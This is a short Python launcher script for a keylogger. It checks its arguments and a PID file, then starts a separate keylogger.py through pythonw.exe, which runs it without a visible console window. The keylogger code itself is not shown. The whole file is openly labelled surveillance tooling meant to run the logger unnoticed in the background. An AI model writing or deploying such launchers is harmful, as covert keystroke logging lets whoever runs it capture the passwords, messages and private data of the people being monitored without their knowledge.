import os
import sys
import subprocess

keylogger_script = 'keylogger.py'

if len(sys.argv) < 3:
    print("Usage: python run_keylogger.py <log_file> <save_interval>")
    sys.exit(1)

log_file = sys.argv[1]
save_interval = sys.argv[2]

pid_file = "keylogger.pid"

if os.path.exists(pid_file):
    print("Keylogger is already running. Please stop the existing keylogger before starting a new one.")
    sys.exit(1)

pythonw_path = os.path.join(sys.exec_prefix, 'pythonw.exe')
subprocess.Popen([pythonw_path, keylogger_script, log_file, save_interval])
